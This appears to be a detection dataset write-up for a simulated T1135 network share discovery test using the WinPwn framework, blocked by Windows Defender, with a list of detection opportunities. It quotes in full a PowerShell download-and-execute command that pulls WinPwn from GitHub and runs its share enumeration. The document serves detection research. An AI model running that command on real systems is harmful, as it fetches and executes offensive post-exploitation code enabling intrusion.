# T1135-9: Network Share Discovery — WinPwn - shareenumeration

## Technique Context

T1135 Network Share Discovery involves adversaries attempting to enumerate network shares on local and remote systems. This technique is commonly used during the discovery phase of an attack to identify accessible file shares that may contain sensitive data or provide lateral movement opportunities. The detection community focuses on monitoring for tools like `net view`, `net share`, PowerShell commands using `Get-SmbShare`, WMI queries, and third-party enumeration tools. This particular test uses WinPwn's shareenumeration module, a PowerShell-based post-exploitation framework that combines multiple discovery techniques.

## What This Dataset Contains

The dataset captures a PowerShell-based network share enumeration attempt that was blocked by Windows Defender's real-time protection. Key telemetry includes:

**Process Chain**: The execution begins with a PowerShell process (PID 43404) that spawns another PowerShell instance (PID 9728), which then attempts to execute a child PowerShell process (PID 11276) with the command line `"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); shareenumeration -noninteractive -consoleoutput}`.

**Network Activity**: Sysmon EID 22 shows a DNS query for `raw.githubusercontent.com` by the final PowerShell process, indicating the attempt to download the WinPwn framework.

**Defender Intervention**: PowerShell EID 4100 shows Windows Defender blocking the script execution with "This script contains malicious content and has been blocked by your antivirus software" during the Invoke-Expression command.

**Supporting Processes**: A `whoami.exe` execution (PID 22700) is captured via Sysmon EID 1, likely part of initial reconnaissance before the share enumeration attempt.

**PowerShell Telemetry**: Multiple EID 4104 script block events capture the download attempt and error handling code, along with EID 4103 module logging showing `New-Object` and `Set-ExecutionPolicy` commands.

## What This Dataset Does Not Contain

The dataset lacks the actual network share discovery activity because Windows Defender blocked the WinPwn script before execution. Missing elements include:

- No network share enumeration commands (`net view`, `Get-SmbShare`, etc.)
- No successful network connections to target systems for share discovery
- No file system access attempts to discovered shares
- No registry queries related to share enumeration
- The sysmon-modular configuration's include-mode filtering means many legitimate processes in the chain may not have generated Sysmon EID 1 events

## Assessment

This dataset provides excellent telemetry for detecting malicious PowerShell download attempts and Defender blocking behavior, but limited value for studying actual network share discovery techniques. The Security channel's full process auditing (EID 4688) complements Sysmon's filtered approach, capturing the complete process execution chain including command lines. The PowerShell logging is comprehensive, showing both the attempted malicious activity and Defender's intervention. While the actual T1135 technique wasn't executed, the pre-execution behaviors (web download, PowerShell execution policy bypass, process spawning) provide valuable detection opportunities for preventing such attacks.

## Detection Opportunities Present in This Data

1. **Malicious PowerShell Download Pattern**: Monitor for PowerShell processes executing `new-object net.webclient).downloadstring` with GitHub raw content URLs, particularly those referencing known offensive frameworks like WinPwn.

2. **Process Chain Analysis**: Detect PowerShell parent-child relationships where the child process attempts to download and execute remote scripts via Invoke-Expression.

3. **Defender Block Events**: Alert on PowerShell EID 4100 events indicating malicious content blocking, especially when combined with download attempts.

4. **Suspicious Command Line Parameters**: Flag PowerShell executions with `-noninteractive` and `-consoleoutput` parameters combined with external script downloads.

5. **DNS Query Correlation**: Monitor for DNS requests to `raw.githubusercontent.com` from PowerShell processes, particularly when followed by execution failures.

6. **Execution Policy Bypass Attempts**: Detect `Set-ExecutionPolicy Bypass` commands in PowerShell module logging (EID 4103) as potential evasion attempts.

7. **Multi-Process PowerShell Chains**: Identify unusual PowerShell process spawning patterns where parent processes launch child PowerShell instances with complex command lines.
